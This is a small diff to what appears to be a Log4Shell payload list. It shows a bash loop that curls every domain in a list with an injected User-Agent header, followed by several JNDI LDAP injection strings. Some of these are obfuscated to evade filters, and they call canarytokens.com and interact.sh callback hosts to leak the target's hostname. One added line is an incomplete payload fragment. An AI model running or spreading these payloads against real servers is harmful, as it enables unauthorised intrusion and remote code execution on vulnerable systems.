@@ -5,7 +5,7 @@ cat alldomain.txt | while read url; do log4=$(curl -s -L $url -H User-Agent:"$\{
 
 
 canary token ${jndi:ldap://x${hostName}.L4J.avq5a8v80j7cfz27bnfqks7fo.canarytokens.com/a}
-
+${jndi${nagli:-:}ldap:${::-/}/
 canary token ${jndi${nagli:-:}ldap:${::-/}/${hostName}.L4J.avq5a8v80j7cfz27bnfqks7fo.canarytokens.com/a}
 
 {jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}}
